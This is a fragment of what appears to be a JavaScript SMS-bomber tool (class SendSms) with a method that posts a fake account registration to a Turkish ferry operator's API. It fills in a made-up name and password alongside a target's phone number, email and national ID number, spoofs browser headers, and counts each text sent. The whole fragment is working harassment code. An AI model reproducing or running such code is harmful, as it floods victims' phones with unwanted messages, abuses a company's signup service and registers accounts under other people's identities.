  async Ido() {
    try {
      const url = "https://api.ido.com.tr:443/idows/v2/register";
      const headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "tr",
        "Content-Type": "application/json",
        "Origin": "https://www.ido.com.tr",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Referer": "https://www.ido.com.tr/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers",
        "Connection": "keep-alive"
      };
      const json = {
        "birthDate": true,
        "captcha": "",
        "checkPwd": "313131",
        "code": "",
        "day": 24,
        "email": this.mail,
        "emailNewsletter": false,
        "firstName": "MEMATI",
        "gender": "MALE",
        "lastName": "BAS",
        "mobileNumber": `0${this.phone}`,
        "month": 9,
        "pwd": "313131",
        "smsNewsletter": true,
        "tckn": this.tc,
        "termsOfUse": true,
        "year": 1977
      };
      const r = await axios.post(url, json, { headers, timeout: 6000 });
      if (r.status === 200) {
        console.log(`\x1b[32m[+] \x1b[0mBaşarılı! ${this.phone} --> api.ido.com.tr`);
        this.adet += 1;
      } else {
        throw new Error();
      }
    } catch {
      console.log(`\x1b[31m[-] \x1b[0mBaşarısız! ${this.phone} --> api.ido.com.tr`);
    }
  }
}
module.exports = SendSms;
